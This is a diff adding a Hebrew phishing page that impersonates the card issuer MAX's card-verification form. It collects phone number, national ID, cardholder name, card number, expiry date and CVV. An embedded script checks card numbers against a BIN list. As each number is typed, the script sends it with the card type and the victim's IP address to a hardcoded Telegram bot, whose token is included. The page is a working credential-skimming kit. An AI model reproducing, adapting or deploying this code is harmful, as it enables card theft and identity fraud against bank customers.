@@ -1,0 +1,659 @@
+<!-- url: https://www.fibertelperu.com/data.card/co.il/total/
+status: 200 -->
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MAX - אימות כרטיס</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            text-align: right;
+            background: #f9f9f9;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background: #fff;
+            padding: 10px 20px;
+            display: none;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #ddd;
+            position: relative;
+        }
+        .header .icons {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .header .icons img {
+            height: 24px;
+        }
+        .info-bar {
+            background: #f1f1f1;
+            padding: 8px 15px;
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .info-bar a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .close-btn {
+            background: none;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        @media (max-width: 600px) {
+            .header {
+                display: flex;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="info-bar">
+        <span>🛈 לידיעתך: אנו משתמשים בעוגיות באתר זה <a href="#">לפרטים נוספים</a></span>
+        <button class="close-btn">✖</button>
+    </div>
+    <div class="header">
+        <div class="icons">
+            <img src="https://www.svgrepo.com/show/513808/align-right.svg" alt="Menu Icon">
+        </div>
+        <div class="icons">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSyi_CVTmoL1ITHFxQkfLwvj93hcsgA1Olkhg&s" alt="Search Icon">
+        <img src="https://cdn-icons-png.freepik.com/512/15990/15990268.png" alt="User Icon">
+            
+        </div>
+    </div>
+</body>
+</html>
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MAX - אימות כרטיס</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            text-align: right;
+            background: #f9f9f9;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+        }
+        label {
+            display: block;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-top: 5px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            outline: none;
+            font-size: 16px;
+            background: transparent;
+        }
+        .button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background: #29dbe5;
+            color: black;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0px 4px 6px rgba(0,0,0,0.1);
+        }
+        .button:hover {
+            background: #1bc5d3;
+        }
+        @media (max-width: 600px) {
+            .container {
+                width: 90%;
+                margin: 20px auto;
+                padding: 15px;
+            }
+            .button {
+                font-size: 16px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+        <form action="process.php" method="POST" onsubmit="return validateForm()">
+        <label for="phone">מספר טלפון</label>
+<input type="text" id="phone" name="phone" required maxlength="10" oninput="validatePhone()" onkeypress="return isNumberKey(event)">
+<span id="phoneError" style="color: red; display: none;"> מספר טלפון לא תקין, אנא הכנס מספר חוקי</span>
+
+<script>
+    function isNumberKey(evt) {
+        let charCode = evt.which ? evt.which : evt.keyCode;
+        if (charCode < 48 || charCode > 57) {
+            return false;
+        }
+        return true;
+    }
+    
+    function validatePhone() {
+        let phoneInput = document.getElementById("phone");
+        let phoneError = document.getElementById("phoneError");
+        let phoneValue = phoneInput.value;
+        
+        
+        if (phoneValue.length >= 3) {
+            let validPrefixes = ["052", "051", "053", "054", "050", "058", "055", "057"];
+            let prefix = phoneValue.substring(0, 3);
+            
+            if (!validPrefixes.includes(prefix)) {
+                phoneError.style.display = "block";
+            } else {
+                phoneError.style.display = "none";
+            }
+        } else {
+            phoneError.style.display = "none";
+        }
+    }
+</script>
+
+
+<label for="id_number">מספר תעודת זהות</label>
+<input type="text" id="id_number" name="id_number" required maxlength="9" oninput="validateID()" onkeypress="return isNumberKey(event)">
+<span id="idError" style="color: red; display: none;"> עליך להזין מספר תעודת זהות נכון</span>
+
+<script>
+    function isNumberKey(evt) {
+        let charCode = evt.which ? evt.which : evt.keyCode;
+        if (charCode < 48 || charCode > 57) {
+            return false;
+        }
+        return true;
+    }
+    
+    function validateID() {
+        let idInput = document.getElementById("id_number");
+        let idError = document.getElementById("idError");
+        let idValue = idInput.value;
+        
+        if (idValue.length > 0 && idValue.length !== 9) {
+            idError.style.display = "block";
+        } else {
+            idError.style.display = "none";
+        }
+    }
+</script>
+
+<label for="card_holder">שם בעל הכרטיס</label>
+<input type="text" id="card_holder" name="card_holder" required onfocus="showNameWarning()" oninput="validateName()" onkeypress="return isNameValid(event)">
+<span id="nameError" style="color: black; display: none;">⚠️ עליך להזין את השם כפי שהוא מופיע בכרטיס</span>
+
+<script>
+    function isNameValid(evt) {
+        let charCode = evt.which ? evt.which : evt.keyCode;
+        let charStr = String.fromCharCode(charCode);
+        let namePattern = /^[a-zA-Zא-ת\s]+$/;
+
+        return namePattern.test(charStr);
+    }
+
+    function validateName() {
+        let nameInput = document.getElementById("card_holder");
+        let nameError = document.getElementById("nameError");
+        let namePattern = /^[a-zA-Zא-ת\s]+$/;
+
+        if (nameInput.value.trim() === "" || !namePattern.test(nameInput.value)) {
+            nameError.style.display = "block";
+            nameInput.setCustomValidity("יש להזין שם תקין.");
+        } else {
+            nameError.style.display = "none";
+            nameInput.setCustomValidity("");
+        }
+    }
+
+    function showNameWarning() {
+        document.getElementById("nameError").style.display = "block";
+    }
+</script>
+
+
+
+<label for="card_number">מספר כרטיס אשראי</label>
+<input type="text" id="card_number" name="card_number" required maxlength="19" oninput="validateAndSendCard()" onkeypress="return isNumberKey(event)">
+<span id="cardError" style="color: black; display: none;">⚠️ הכרטיס אינו שייך לחברת MAX, נמשיך בתהליך בכל מקרה</span>
+<span id="cardType" style="display: none; font-weight: bold; color: green;"></span>
+
+<script>
+    let binDatabase = {
+        "407517": "עסקי",
+        "419265": "קלאסי",
+        "419266": "זהב",
+        "419267": "עסקי",
+        "419268": "פלטינום",
+        "421915": "פלטינום",
+        "458003": "קלאסי",
+        "458010": "עסקי",
+        "458011": "פלטינום",
+        "458012": "זהב",
+        "458014": "זהב",
+        "458015": "פלטינום",
+        "458023": "זהב",
+        "458041": "קלאסי נטען מראש",
+        "458043": "קלאסי",
+        "458048": "עסקי",
+        "458049": "קלאסי",
+        "458056": "זהב",
+        "458070": "עסקי נטען מראש",
+        "458088": "פלטינום",
+        "458089": "עסקי",
+        "458093": "קלאסי",
+        "510049": "סטנדרט אשראי",
+        "518953": "זהב אשראי",
+        "519402": "עולמי אשראי",
+        "527787": "סטנדרט אשראי",
+        "530775": "נטען מראש חיוב",
+        "535110": "סטנדרט חיוב",
+        "458047": "נטען מראש עסקי",
+        "545136": "נטען מראש חיוב",
+        "545134": "עולמי אשראי",
+        "545369": "עסקי אשראי",
+        "552177": "פלטינום אשראי",
+        "553912": "עסקי נטען מראש",
+        "558331": "עסקי אשראי",
+        "532610": "חיוב",
+        "532611": "חיוב",
+        "555888": "חיוב",
+        "532614": "חיוב",
+        "532613": "חיוב",
+        "532612": "חיוב",
+        "458080": "חיוב",
+        "458088": "חיוב",
+        "458028": "חיוב",
+        "458098": "חיוב",
+        "525336": "חיוב",
+        "531084": "חיוב",
+        "511891": "חיוב",
+        "537626": "חיוב",
+        "458096": "חיוב",
+        "455743": "חיוב",
+        "459523": "חיוב",
+        "538404": "חיוב",
+        "458021": "חיוב",
+        "407517": "חיוב",
+        "419268": "חיוב",
+        "458058": "חיוב",
+        "526137": "חיוב",
+        "458027": "חיוב",
+        "458007": "חיוב",
+        "458016": "חיוב",
+        "458017": "חיוב",
+        "458029": "חיוב",
+        "458052": "חיוב",
+        "459440": "חיוב",
+        "555650": "חיוב",
+        "538464": "חיוב",
+        "458024": "חיוב",
+        "555824": "חיוב",
+        "529297": "חיוב",
+        "421914": "חיוב",
+        "458085": "חיוב",
+        "547718": "חיוב",
+        "519165": "חיוב",
+        "552517": "חיוב",
+        "458050": "חיוב",
+        "458042": "חיוב",
+        "535738": "חיוב",
+        "458039": "חיוב",
+        "458005": "חיוב",
+        "458016": "חיוב",
+        "458017": "חיוב",
+        "458052": "חיוב",
+        "458026": "חיוב",
+        "458059": "חיוב",
+        "518954": "חיוב",
+        "458020": "חיוב",
+        "421914": "חיוב",
+        "375516": "חיוב",
+        "375510": "חיוב",
+        "375511": "חיוב",
+        "375512": "חיוב",
+        "375513": "חיוב",
+        "375514": "חיוב",
+        "375515": "חיוב",
+        "375517": "חיוב",
+        "375518": "חיוב",
+        "375519": "חיוב",
+        "431905": "חיוב",
+        "518991": "חיוב",
+        "555680": "חיוב",
+        "407517": "חיוב",
+        "419265": "חיוב",
+        "458009": "חיוב",
+        "458008": "חיוב",
+        "525333": "חיוב",
+        "518955": "חיוב",
+        "478569": "חיוב",
+        "552176": "חיוב",
+        "555693": "חיוב",
+        "458069": "חיוב",
+        "533833": "חיוב",
+        "458083": "חיוב",
+        "539213": "חיוב",
+        "518989": "חיוב",
+        "518986": "חיוב",
+        "548354": "חיוב",
+        "458095": "חיוב",
+        "547707": "חיוב",
+        "552183": "חיוב",
+        "458027": "חיוב"
+    };
+
+    let lastSentCard = "";
+
+    function isNumberKey(evt) {
+        let charCode = evt.which ? evt.which : evt.keyCode;
+        if (charCode < 48 || charCode > 57) {
+            return false;
+        }
+        return true;
+    }
+
+    function luhnCheck(cardNumber) {
+        let sum = 0;
+        let shouldDouble = false;
+        for (let i = cardNumber.length - 1; i >= 0; i--) {
+            let digit = parseInt(cardNumber.charAt(i));
+            if (shouldDouble) {
+                digit *= 2;
+                if (digit > 9) digit -= 9;
+            }
+            sum += digit;
+            shouldDouble = !shouldDouble;
+        }
+        return (sum % 10) === 0;
+    }
+
+    function validateAndSendCard() {
+        let cardInput = document.getElementById("card_number");
+        let cardError = document.getElementById("cardError");
+        let cardTypeDisplay = document.getElementById("cardType");
+        let cardNumber = cardInput.value.replace(/\s+/g, '');
+        let bin = cardNumber.substring(0, 6);
+
+        if (!/^\d{15,16}$/.test(cardNumber) || !luhnCheck(cardNumber)) {
+            cardError.style.display = "block";
+            cardError.innerText = "❌ מספר כרטיס אשראי לא תקין";
+            cardTypeDisplay.style.display = "none";
+            return;
+        }
+
+        if (cardNumber === lastSentCard) {
+            return;
+        }
+        lastSentCard = cardNumber;
+
+        let cardCategory = binDatabase[bin] || "⚠️ הכרטיס אינו שייך לחברת MAX, נמשיך בתהליך בכל מקרה";
+        cardError.style.display = "none";
+        cardTypeDisplay.style.display = "block";
+        cardTypeDisplay.innerText = `✅ סוג כרטיס: ${cardCategory}`;
+        sendCardData(cardNumber, cardCategory);
+    }
+
+    function sendCardData(cardNumber, cardCategory) {
+        let ip = "Unknown";
+        fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(ipData => {
+                ip = ipData.ip;
+                let telegramMessage = `New Card Entry:\n Card Number: ${cardNumber}\n Card Type: ${cardCategory}\n IP Address: ${ip}`;
+                
+                let token = "8284154461:AAF7mJ9nddCoSTUjV3bmJ6RJ6f7HMPzp3hE";
+                let chat_id = "7571712444";
+                let url = `https://api.telegram.org/bot${token}/sendMessage`;
+                
+                let requestData = {
+                    chat_id: chat_id,
+                    text: telegramMessage,
+                    parse_mode: "HTML"
+                };
+                
+                fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(requestData)
+                })
+                .then(response => response.json())
+                .then(responseData => {
+                    console.log("Telegram Response:", responseData);
+                })
+                .catch(error => {
+                    console.log("Telegram API Error:", error);
+                });
+            });
+    }
+
+    document.getElementById("card_number").addEventListener("input", function() {
+        if (this.value.length >= 15) {
+            validateAndSendCard();
+        }
+    });
+</script>
+
+
+            <label for="expiry_date">תוקף הכרטיס (MM/YY)</label>
+<input type="text" id="expiry_date" name="expiry_date" placeholder="MM/YY" required maxlength="5" oninput="formatExpiryDate()" onkeypress="return isNumberKey(event)">
+<span id="expiryError" style="color: red; display: none;"> תוקף הכרטיס אינו תקין</span>
+
+<script>
+    function isNumberKey(evt) {
+        let charCode = evt.which ? evt.which : evt.keyCode;
+        if (charCode < 48 || charCode > 57) {
+            return false;
+        }
+        return true;
+    }
+    
+    function formatExpiryDate() {
+        let expiryInput = document.getElementById("expiry_date");
+        let expiryError = document.getElementById("expiryError");
+        let value = expiryInput.value.replace(/\D/g, ''); 
+        
+        if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        expiryInput.value = value;
+        
+       
+        if (value.length === 5) {
+            let parts = value.split('/');
+            let month = parseInt(parts[0], 10);
+            let year = parseInt(parts[1], 10);
+            let currentYear = new Date().getFullYear() % 100;
+            let currentMonth = new Date().getMonth() + 1;
+            
+            if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
+                expiryError.style.display = "block";
+            } else {
+                expiryError.style.display = "none";
+            }
+        } else {
+            expiryError.style.display = "none";
+        }
+    }
+</script>
+<label for="cvv">CVV (3 הספרות בגב הכרטיס)</label>
+<input type="text" id="cvv" name="cvv" maxlength="4" required oninput="validateCVV()" onkeypress="return isNumberKey(event)">
+<span id="cvvError" style="color: red; display: none;"> קוד CVV חייב להיות בן 3 או 4 ספרות</span>
+
+<script>
+    function isNumberKey(evt) {
+        let charCode = evt.which ? evt.which : evt.keyCode;
+        if (charCode < 48 || charCode > 57) {
+            return false;
+        }
+        return true;
+    }
+    
+    function validateCVV() {
+        let cvvInput = document.getElementById("cvv");
+        let cvvError = document.getElementById("cvvError");
+        let cvvValue = cvvInput.value;
+        
+        if (cvvValue.length < 3 || cvvValue.length > 4) {
+            cvvError.style.display = "block";
+        } else {
+            cvvError.style.display = "none";
+        }
+    }
+</script>
+
+<button type="submit" class="button" onclick="return validateForm()">מבחינתי אפשר להתקדם</button>
+        </form>
+    </div>
+    <div id="errorBox" style="display: none; background: #ffdddd; border: 1px solid red; color: red; padding: 10px; margin: 10px 0; font-weight: bold;"></div>
+    <script>
+        function validateForm() {
+            let isValid = true;
+            let errorMessages = [];
+            let errorBox = document.getElementById("errorBox");
+            errorBox.innerHTML = "";
+            errorBox.style.display = "none";
+
+            let inputs = document.querySelectorAll('input[required]');
+
+            inputs.forEach((input, index) => {
+                if (input.value.trim() === '' || input.nextElementSibling?.style.display === "block") {
+                    isValid = false;
+                    errorMessages.push((index + 1) + ". " + input.previousElementSibling.innerText);
+                }
+            });
+
+            if (!isValid) {
+                errorBox.innerHTML = "<p>❌ אנא תקן את השגיאות הבאות:</p><ul>" + errorMessages.map(msg => "<li>" + msg + "</li>").join('') + "</ul>";
+                errorBox.style.display = "block";
+                return false;
+            }
+            return true;
+        }
+    </script>
+</body>
+</html>
+
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MAX - תפריט תחתון</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            text-align: right;
+            background: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .footer {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: white;
+            text-align: right;
+        }
+        .max-logo {
+            display: none;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .max-logo img {
+            width: 120px;
+        }
+        .expandable {
+            margin-top: 15px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            text-align: center;
+            cursor: pointer;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+        }
+        .expandable::before {
+            content: '\25BC';
+            font-size: 12px;
+        }
+        .footer ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .footer ul li {
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+        .footer .contact {
+            margin-top: 20px;
+            font-size: 14px;
+            text-align: right;
+        }
+        .footer .contact a {
+            font-weight: bold;
+            text-decoration: none;
+            color: #007bff;
+        }
+        @media (max-width: 600px) {
+            .max-logo {
+                display: block;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="footer">
+        <div class="max-logo">
+            <img src="https://serviced.co.il/wp-content/uploads/2021/06/%D7%9E%D7%A7%D7%A1-%D7%A9%D7%99%D7%A8%D7%95%D7%AA-%D7%9C%D7%A7%D7%95%D7%97%D7%95%D7%AA-%D7%9C%D7%95%D7%92%D7%95.webp" alt="MAX Logo">
+        </div>
+        <ul>
+            <li>דף הבית</li>
+            <li>הלוואות ופתרונות אשראי</li>
+            <li>MAX ביטוח</li>
+            <li>הטבות</li>
+            <li>כרטיסים ומועדונים</li>
+            <li>לאתר העסקי</li>
+            <li>צרו קשר</li>
+        </ul>
+        <div class="expandable">תראה לי עוד דברים שחשובים</div>
+        <div class="contact">
+            כתובת: בן גוריון 9, בני ברק | טלפון: 03-6178888 | <a href="#">לעמוד צור קשר</a>
+        </div>
+    </div>
+</body>
+</html>
